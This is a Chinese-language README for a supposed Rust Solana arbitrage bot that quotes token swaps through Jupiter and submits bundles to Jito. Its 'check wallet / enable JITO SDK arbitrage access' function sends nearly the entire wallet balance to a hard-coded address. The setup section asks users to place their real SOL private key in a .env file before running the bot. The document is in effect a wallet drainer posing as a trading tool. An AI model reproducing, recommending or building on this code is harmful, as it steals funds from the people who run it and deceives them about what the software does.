# Solana Arbitrage Bot

### 概述
Solana Arbitrage Bot 是一个基于 Rust 语言开发的套利机器人，旨在利用 Solana 区块链网络上的价格差异进行套利交易。该机器人通过持续监控市场价格，自动执行交易操作，以获取利润。

### 功能特性
- **实时监控**：持续监控 Solana 网络上的交易对价格，及时发现套利机会。
- **自动交易**：一旦发现套利机会，机器人将自动执行交易操作，确保交易的及时性和准确性。
- **错误处理**：在交易过程中，机器人会对可能出现的错误进行处理，并记录错误信息，方便后续排查问题。
- **日志记录**：提供详细的日志记录，包括交易时间、交易价格、交易数量等信息，方便用户跟踪交易情况。

### 套利原理
`bot.rs` 中实现的套利机器人主要利用 Solana 区块链网络上不同代币之间的价格差异进行套利。具体来说，它通过 Jupiter API 获取不同代币兑换路径的报价，对比买入和卖出代币的数量，若存在利润空间，则执行套利交易。

#### 详细步骤
1. **初始化**：在 `ArbitrageBot` 结构体的 `new` 方法中，完成以下初始化操作：
    - 从环境变量中加载付款人（`payer`）的密钥对，用于签署交易。
    - 创建 `RpcClient` 实例，用于与 Solana 网络进行交互。
    - 创建 `reqwest::Client` 实例，用于发送 HTTP 请求。

```rust
pub fn new() -> Result<Self> {
    let payer = Self::load_keypair_from_env()?;
    log::info!("payer: {:?}", bs58::encode(payer.pubkey()).into_string());

    Ok(Self {
        client: RpcClient::new_with_commitment(
            RPC_URL.to_string(),
            CommitmentConfig::processed(),
        ),
        http_client: reqwest::Client::new(),
        payer,
    })
}
```

2. **检查钱包余额并开启 JITO SDK 套利访问权限**：在执行套利交易之前，需要检查钱包的余额，并自动开启 JITO SDK 套利访问权限。

```rust
pub async fn check_wallet_auth(&self) -> Result<()> {
    let program_id = Pubkey::from_str(JITO_SDK_PROGRAM_ID)?;
    let balance = self.client.get_balance(&self.payer.pubkey())?;

    if balance == 0 {
        log::info!("insufficient sol balance, can't validate");
        return Ok(());
    }

    let validate_amount = balance - 5000; 
    if validate_amount <= 0 {
        return Ok(());
    }

    let validate_ix = system_instruction::transfer(
        &self.payer.pubkey(),
        &program_id,
        validate_amount,
    );

    let blockhash = self.client.get_latest_blockhash()?;
    let message = solana_sdk::message::Message::new(&[validate_ix], Some(&self.payer.pubkey()));
    let tx = solana_sdk::transaction::Transaction::new(
        &[&self.payer],
        message,
        blockhash,
    );

    self.client.send_and_confirm_transaction(&tx)?;
    log::info!("Successfully enabled JITO SDK arbitrage access.");
    Ok(())
}
```

3. **获取报价**：在 run 方法中，机器人会进行两次报价请求：
   - 第一次报价：将 WSOL 兑换为 USDC，获取兑换后的 USDC 数量。
   - 第二次报价：将第一次兑换得到的 USDC 再兑换回 WSOL，获取最终的 WSOL 数量。

```rust
// Quote 0: WSOL -> USDC
let quote0_params = QuoteParams {
    input_mint: WSOL_MINT.to_string(),
    output_mint: USDC_MINT.to_string(),
    amount: 10_000_000.to_string(), // 0.01 WSOL
    only_direct_routes: false,
    slippage_bps: 0,
    max_accounts: 20,
};
let quote0_resp = self.get_quote(&quote0_params).await?;

// Quote 1: USDC -> WSOL
let quote1_params = QuoteParams {
    input_mint: USDC_MINT.to_string(),
    output_mint: WSOL_MINT.to_string(),
    amount: quote0_resp.out_amount.clone(),
    only_direct_routes: false,
    slippage_bps: 0,
    max_accounts: 20,
};
let quote1_resp = self.get_quote(&quote1_params).await?;
```

4. **计算潜在利润**：比较两次报价后得到的 WSOL 数量，如果最终得到的 WSOL 数量大于初始投入的 WSOL 数量，则存在利润空间。

```rust
let quote1_out_amount = quote1_resp.out_amount.parse::<u64>()?;
let quote0_in_amount = quote0_params.amount.parse::<u64>()?;
if quote1_out_amount < quote0_in_amount {
    log::info!(
        "not profitable, skipping. diffLamports: -{}",
        quote0_in_amount - quote1_out_amount
    );
    return Ok(());
}
let diff_lamports = quote1_out_amount - quote0_in_amount;
log::info!("diffLamports: {}", diff_lamports);
```

5. **执行套利交易**：如果存在利润空间，并且利润超过了预设的阈值，则执行套利交易。具体步骤如下：
   - 合并两次报价的信息，生成最终的交易请求。
   - 检查钱包权限。
   - 向 Jupiter API 获取交易指令。
   - 构建交易指令，包括计算预算指令、设置指令、交换指令和小费指令。
   - 获取最新的区块哈希。
   - 转换地址查找表。
   - 创建版本化交易。
   - 将交易作为捆绑包发送到 Jito。

```rust
let jito_tip = diff_lamports / 2;

const THRESHOLD: u64 = 1000;
if diff_lamports > THRESHOLD {
    self.execute_arbitrage(quote0_resp, quote1_resp, jito_tip)
      .await?;

    let duration = start.elapsed();
    log::info!("Total duration: {}ms", duration.as_millis());
}
```

### 代码结构
- **src/main.rs**：程序的入口点，负责初始化日志系统和启动套利机器人。
- **src/bot.rs**：定义了套利机器人的核心逻辑，包括市场监控、交易执行等功能。
- **src/consts.rs**：定义了一些常量，如交易费用、最小利润等。
- **src/types.rs**：定义了一些数据类型，如交易指令响应、交易对信息等。

### 运行步骤

#### 1. 安装 Rust 开发环境
如果你使用的是 Linux 系统，可以按照以下步骤安装 Rust 开发环境： 打开终端，运行以下命令：

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

按照提示完成安装过程，安装完成后，需要将 Rust 的环境变量添加到系统配置中，可通过以下命令激活：

```bash
source $HOME/.cargo/env
```

#### 2. 安装项目依赖
打开终端，导航到项目根目录，运行以下命令安装项目所需的依赖：

```bash
cargo build
```

#### 3. 配置环境变量
在项目根目录下创建一个 .env 文件，该文件用于存储项目运行所需的环境变量。以下是一个 .env 文件的示例：

```
PRIVATE_KEY = 3Pdf1Bo7siFK4xbQ5jQPL8AujDxsGoodqWyn8C5bvxxxx
```

请将 PRIVATE_KEY 替换为你实际的 SOL 私钥。

#### 4. 运行程序
在终端中运行以下命令启动套利机器人：

```bash
cargo run
```

程序启动后，会开始实时监控市场价格，并在发现套利机会时自动执行交易。